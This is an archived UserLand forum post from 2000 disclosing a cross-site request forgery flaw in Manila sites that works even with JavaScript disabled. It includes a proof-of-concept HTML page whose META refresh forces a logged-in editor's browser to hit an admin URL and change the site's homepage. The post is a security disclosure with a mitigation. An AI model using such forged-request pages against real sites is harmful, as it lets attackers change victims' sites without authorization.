@@ -1,0 +1,20 @@
+<html>	<head>		<title>Manila security hole w/o JavaScript</title>		</head>	<body>		<blockquote><blockquote>			<b>Archive of UserLand's first discussion group, started October 5, 1998.</b><hr>			<h2>Manila security hole w/o JavaScript</h2>			<table cellpadding="0" cellspacing="5">				<tr><td><b>Author:</b></td><td>Jake Savin</td></tr>				<tr><td><b>Posted:</b></td><td>5/9/2000; 8:18:19 PM</td></tr>				<tr><td><b>Topic:</b></td><td><a href="msg017140.html">Manila security hole w/o JavaScript</a></td></tr>				<tr><td><b>Msg #:</b></td><td>17140</td></tr>				<tr><td><b>Prev/Next:</b></td><td><a href="msg017139.html">17139</a> / <a href="msg017141.html">17141</a></td></tr>				</table>			<br>It turns out that Manila sites are susceptible to the security hole <a href="http://www.zope.org/Members/jim/ZopeSecurity/ClientSideTrojan">described</a> on the Zope.org website, even if JavaScript is turned off in your browser.<p>
+
+It's even worse than it appears!<p>
+
+This HTML flipped the homepage of my test site even though I had JavaScript turned off:<p>
+
+<pre>
+<html>
+	<head>
+		<title>I'm about to flip your homepage</title>
+		<META HTTP-EQUIV="Refresh" CONTENT="5; URL=http://static.userland.com/userLandDiscussArchive/'http://tester.braincase.net/admin/postFlip'">
+		</head>
+	<body>
+		Flipping your home page in 5 seconds...
+		</body>
+	</html>
+</pre><p>
+
+You're at risk whenever your browser is logged in to your site (you have a good cookie) and you have managing editor privileges. The only sure way to avoid the risk is to sign out before you visit any untrusted site.
+			<br><br>			<br><br><hr>This page was archived on 6/13/2001; 4:55:08 PM.<br><br>&copy; Copyright 1998-2001 <a href="http://www.userland.com/">UserLand Software</a>, Inc.			</blockquote></blockquote>		</body>	</html>
